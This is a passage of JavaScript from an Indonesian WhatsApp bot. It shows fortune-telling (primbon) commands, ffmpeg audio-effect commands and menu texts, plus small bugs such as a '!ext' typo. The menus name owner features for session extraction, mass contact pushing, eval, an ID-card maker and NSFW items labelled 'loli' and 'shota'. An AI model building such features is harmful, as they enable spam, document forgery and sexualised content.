                conn.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika|Novia`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) return newReply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)return newReply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': {
                if (!text) return newReply(`Contoh : 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) return newReply(`Contoh : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') return date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) return newReply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
                let anu = await primbon.shio(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message}`, m)
            }
            break
            
            case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else newReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                }
            break
            
            /*
            case 'setcmd': {
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Tidak Ditemukan ❎')
                if (!text) return newReply(`Untuk Command Apa?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: +new Date,
                    locked: false,
                }
                newReply(mess.done)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return newReply(`Tidak Ada Hash`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                delete global.db.data.sticker[hash]
                newReply(mess.done)
            }
            break
            case 'listcmd': {
                let teks = `*List Hash 🚀*
Info: *bold* hash is Locked 🔒

*Hash ☕ :*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                conn.sendText(m.chat, teks, m, {
                    mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a, b) => [...a, ...b], [])
                })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return newReply(mess.owner)
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return newReply('Hash Not Found In Database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                newReply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) return newReply('Reply Message Yang Ingin Disave Di Database')
                if (!text) return newReply(`Contoh : ${prefix + command} Nama File`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return newReply(`'${text}' Telah Terdaftar Di List Pesan`)
                msgs[text.toLowerCase()] = quoted.fakeObj
                newReply(`Berhasil Menambahkan Pesan Di List Pesan Sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return newReply(`Contoh : ${prefix + command} File Name\n\nLihat List Pesan Dengan ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' Tidak Terdaftar Di List Pesan`)
                conn.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
                let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => {
                    return {
                        nama,
                        ...isi
                    }
                })
                let teks = 'LIST DATABASE 📂\n\n'
                for (let i of seplit) {
                    teks += `📛 *Name :* ${i.nama}`
                    teks += `🚀 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
                }
                newReply(teks)
            }
            break
            case 'delmsg':
            case 'deletemsg': {
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' tidak terdaftar didalam list pesan`)
                delete msgs[text.toLowerCase()]
                newReply(`Berhasil menghapus '${text}' dari list pesan`)
            }
            break
            */
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 3
koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await conn.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break

            case 'menu':
case 'help': {
    let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   
${readmore}
▧ *S U B -- M E N U*
    ☍ ${prefix}allmenu
    ☍ ${prefix}genshinmenu
    ☍ ${prefix}ownermenu
    ☍ ${prefix}funmenu
    ☍ ${prefix}gamemenu
    ☍ ${prefix}menupushkontak
    ☍ ${prefix}panelmenu
    ☍ ${prefix}mainmenu
    ☍ ${prefix}premmenu
    ☍ ${prefix}primbonmenu
    ☍ ${prefix}groupmenu
    ☍ ${prefix}datamenu
    ☍ ${prefix}nsfwmenu
    ☍ ${prefix}ramdonmenu
    ☍ ${prefix}asupanmenu
    ☍ ${prefix}toolsmenu
    ☍ ${prefix}creatormenu
    ☍ ${prefix}islammenu
    ☍ ${prefix}downmenu
    ☍ ${prefix}ephoto1
    ☍ ${prefix}photooxy1
    ☍ ${prefix}textpro1
    ☍ ${prefix}textpro2
    ☍ ${prefix}aimenu
    ☍ ${prefix}infomenu
    ☍ ${prefix}animemenu
    ☍ ${prefix}convertmenu
    ☍ ${prefix}stalkmenu
    ☍ ${prefix}soundmenu
    ☍ ${prefix}mememenu`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'allmenu': {
    let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   
▧ 「 *S U B -- M E N U* 」
    ☍ ${prefix}allmenu
    ☍ ${prefix}genshinmenu
    ☍ ${prefix}ownermenu
    ☍ ${prefix}funmenu
    ☍ ${prefix}gamemenu
    ☍ ${prefix}mainmenu
    ☍ ${prefix}premmenu
    ☍ ${prefix}primbonmenu
    ☍ ${prefix}groupmenu
    ☍ ${prefix}datamenu
    ☍ ${prefix}nsfwmenu
    ☍ ${prefix}ramdonmenu
    ☍ ${prefix}panelmenu
    ☍ ${prefix}menupushkontak
    ☍ ${prefix}asupanmenu
    ☍ ${prefix}toolsmenu
    ☍ ${prefix}creatormenu
    ☍ ${prefix}islammenu
    ☍ ${prefix}downmenu
    ☍ ${prefix}ephoto1
    ☍ ${prefix}photooxy1
    ☍ ${prefix}textpro1
    ☍ ${prefix}textpro2
    ☍ ${prefix}aimenu
    ☍ ${prefix}infomenu
    ☍ ${prefix}animemenu
    ☍ ${prefix}convertmenu
    ☍ ${prefix}stalkmenu
    ☍ ${prefix}mememenu
${readmore}
▧ 「 *O W N E R* 」
│ ‣ ${prefix}listpc
│ ‣ ${prefix}listgc
│ ‣ ${prefix}public
│ ‣ ${prefix}self
│ ‣ ${prefix}enc
│ ‣ ${prefix}pushkontak
│ ‣ ${prefix}bcgc
│ ‣ ${prefix}bc
│ ‣ ${prefix}lockcmd
│ ‣ ${prefix}addprem
│ ‣ ${prefix}delprem
│ ‣ ${prefix}addlimit
│ ‣ ${prefix}dellimit
│ ‣ ${prefix}addvn
│ ‣ ${prefix}delvn
│ ‣ ${prefix}myip
│ ‣ ${prefix}chat
│ ‣ ${prefix}react
│ ‣ ${prefix}shutdown
│ ‣ ${prefix}join
│ ‣ ${prefix}leave
│ ‣ ${prefix}setexif
│ ‣ ${prefix}setppbot
│ ‣ ${prefix}setppbot full
│ ‣ ${prefix}setnamabot
│ ‣ ${prefix}setbiobot
│ ‣ ${prefix}block
│ ‣ ${prefix}unblock
│ ‣ ${prefix}ambilsesi
│ ‣ ${prefix}ambilcase
│ ‣ ${prefix}autoread
│ ‣ ${prefix}cekapikey
│ ‣ ${prefix}autobio
│ ‣  >
│ ‣  =>
└──···

▧ 「 *G E N S H I N* 」
│ ‣ ${prefix}enka *<uid>*
└──···

▧ 「 *F U N* 」
│ ‣ ${prefix}apakah
│ ‣ ${prefix}bisakah
│ ‣ ${prefix}bagaimanakah
│ ‣ ${prefix}rate
│ ‣ ${prefix}gantengcek
│ ‣ ${prefix}cekganteng
│ ‣ ${prefix}cantikcek
│ ‣ ${prefix}cekcantik
│ ‣ ${prefix}sangecek
│ ‣ ${prefix}ceksange
│ ‣ ${prefix}gaycek
│ ‣ ${prefix}cekgay
│ ‣ ${prefix}lesbicek
│ ‣ ${prefix}ceklesbi
│ ‣ ${prefix}kapankah
│ ‣ ${prefix}wangy
│ ‣ ${prefix}cekmati
│ ‣ ${prefix}halah
│ ‣ ${prefix}hilih
│ ‣ ${prefix}huluh
│ ‣ ${prefix}heleh
│ ‣ ${prefix}holoh
└──···

▧ 「 *G A M E S* 」
│ ‣ ${prefix}tebak gambar
└──···

▧ 「 *M A I N* 」
│ ‣ ${prefix}owner
│ ‣ ${prefix}ping
│ ‣ ${prefix}menu
│ ‣ ${prefix}speedtest
│ ‣ ${prefix}runtime
│ ‣ ${prefix}ceklimit
└──···

▧ 「 *P R E M I U M* 」
│ ‣ ${prefix}ktpmaker
│ ‣ ${prefix}art
│ ‣ ${prefix}loli
│ ‣ ${prefix}neko
│ ‣ ${prefix}waifu
│ ‣ ${prefix}waifu2
│ ‣ ${prefix}shota
│ ‣ ${prefix}husbu
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}shinobu
│ ‣ ${prefix}wallnime
└──···

▧ 「 *P R I M B O N* 」
│ ‣ ${prefix}nomorhoki
